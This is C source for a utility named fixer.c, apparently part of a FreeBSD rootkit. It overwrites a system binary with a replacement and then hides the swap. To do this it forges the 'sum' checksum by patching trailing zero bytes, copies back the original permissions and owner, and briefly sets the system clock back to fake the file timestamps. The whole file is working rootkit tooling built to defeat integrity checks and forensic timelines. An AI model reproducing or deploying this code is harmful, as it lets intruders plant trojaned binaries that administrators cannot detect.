/*
 *	fixer.c
 *	by Idefix 
 *	inspired on sum.c and SaintStat 2.0
 *	updated by Cybernetik for linux rootkit
 *	text file busy bug fixed, no longer requires backup filename, grammar 
 */

/* cleaned up for the FreeBSD rootkit */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <stdio.h>
#include <unistd.h>

#include "rootkitutil.h"

main(int argc,char **argv)
{
	unsigned orig_crc,current_crc,temp;
	unsigned char diff1,diff2,buf[20];
	struct stat statbuf;
	struct timeval ftime[2], otime, ntime;
	struct timezone tzp;
	long position;
	FILE *f;
	int i,fix=1;
	char syscmd[100];

	BASENAME(argv[0])

	if(argc!=3 && argc!=4)
		USAGE("original replacement [backup]")

	if(stat(argv[1],&statbuf)<0)
		ERR("stat")

	if(sum(argv[1],&orig_crc)<0)
		exit(1);
	if(sum(argv[2],&current_crc)<0)
		exit(1);

	if(argc==4) {
		sprintf(syscmd,"/bin/cp %s %s",argv[1],argv[3]);
		system(syscmd);
	}

	sprintf(syscmd,"/bin/mv %s %s",argv[2],argv[1]);
	system(syscmd);

	diff1=(orig_crc&0xFF)-(current_crc&0xFF);
	temp=(current_crc+diff1)&0xFFFF;
	
	for(i=0;i<8;i++) {
		if(temp&1)
			temp=(temp>>1)+0x8000;
		else
			temp>>=1;
	}

	diff2=((orig_crc&0xFF00)>>8)-(temp&0xFF);
	temp=(temp+diff2)&0xFFFF;

	for(i=0;i<8;i++) {
		if(temp&1)
			temp=(temp>>1)+0x8000;
		else
			temp>>=1;
	}

	if((temp-orig_crc)==1)
		diff1=diff1-1;

	if(!(f=fopen(argv[1], "r+b"))) {
		fprintf(stderr, "%s: Can't open %s\n",RK_PROG,argv[1]);
		exit(1);
	}

	fseek(f,0L,SEEK_END);
	position=ftell(f)-17;
	fseek(f,position,SEEK_SET);
	fread(buf,17,1,f);

	for(i=0;i<17;i++)
		if(buf[i]!=0) {
			fprintf(stderr,"%s: Last 17 bytes not zero\n%s: Can't fix checksum\n",
				RK_PROG,RK_PROG);
			fix=0;
			break;
		}

	if(fix) {
		buf[0]=diff1;
		buf[8]=diff2;
		fseek(f,position,SEEK_SET);
		fwrite(buf,17,1,f);
	}

	fclose(f);	
	
	if(chmod(argv[1],statbuf.st_mode))
		ERR("chmod")
	
	if(chown(argv[1],statbuf.st_uid,statbuf.st_gid))
		ERR("chown")
	
	ftime[0].tv_sec=statbuf.st_atime;
	ftime[1].tv_sec=statbuf.st_mtime;
	ntime.tv_sec=statbuf.st_ctime;
	ftime[0].tv_usec=ftime[1].tv_usec=ntime.tv_usec=0;
	
	
	if(gettimeofday(&otime,&tzp))
		ERR("gettimeofday")
	
	if(settimeofday(&ntime,&tzp))
		ERR("settimeofday")
	
	if(utimes(argv[1],ftime))
		ERR("utimes")

	if(settimeofday(&otime,&tzp))
		ERR("settimeofday")

	fprintf(stderr,"%s: File %s fixed\n",RK_PROG,argv[1]);
	return(0);	
}


sum(char *file,unsigned *crc)
{
	unsigned sum;
	int i, c;
	FILE *f;
	long nbytes;
	int errflg=0;

	if(!(f=fopen(file, "r"))) {
		fprintf(stderr, "%s: Can't open %s\n",RK_PROG,file);
		return(-1);
	}

	sum=0;
	nbytes=0;

	while((c=getc(f))!=EOF) {
		nbytes++;
		if(sum&01)
			sum=(sum>>1)+0x8000;
		else
			sum>>=1;
		sum+=c;
		sum&=0xFFFF;
	}

	if(ferror(f)) {
		errflg++;
		fprintf(stderr, "%s: read error on %s\n",RK_PROG,file);
		return(-1);
	}

	fclose(f);
	*crc=sum;
	return(0);
}
